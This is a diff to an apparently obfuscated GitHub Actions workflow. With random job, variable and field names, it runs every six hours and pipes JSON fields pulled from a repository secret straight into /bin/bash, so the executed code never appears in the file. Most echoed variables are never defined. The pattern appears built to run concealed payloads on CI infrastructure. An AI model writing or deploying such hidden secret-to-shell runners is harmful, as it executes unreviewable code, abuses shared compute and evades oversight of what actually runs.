@@ -1,9 +1,9 @@
 name: zonxxki
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 1/6 * * *'
-
+    - cron: '17 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,9 +11,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: zonxxki
         env:
-          ajaxy4444: ${{ secrets.ajaxy4444 }}
+          rtcny23181: ${{ secrets.rtcny23181 }}
         run: |
-          echo $ajaxy4444 | jq -r .jvtr610 | /bin/bash
-          echo $ene7614 | jq -r .si0329 | /bin/bash
-          echo $z6968 | jq -r .qw41 | /bin/bash
+          echo $rtcny23181 | jq -r .vxyt4524 | /bin/bash
+          echo $xtmbr7 | jq -r .lprm819 | /bin/bash
+          echo $smo9 | jq -r .rnji622 | /bin/bash
+          echo $lxat2 | jq -r .wof37 | /bin/bash
+          echo $zccr2605 | jq -r .eu6 | /bin/bash
+          echo $mv0 | jq -r .xn418 | /bin/bash
+          echo $elk93 | jq -r .h067 | /bin/bash
+          echo $r1 | jq -r .zsl799 | /bin/bash
+          echo $anr608 | jq -r .ek64 | /bin/bash
+          echo $jr740 | jq -r .rinpu85269 | /bin/bash
+          echo $pjc37 | jq -r .ndee42465 | /bin/bash
+          echo $neg035 | jq -r .rhbi94 | /bin/bash
+          echo $nfk24 | jq -r .xlrxe69 | /bin/bash
+          echo $rv94723 | jq -r .j4 | /bin/bash
+          echo $fgkwu5 | jq -r .ftw86 | /bin/bash
 
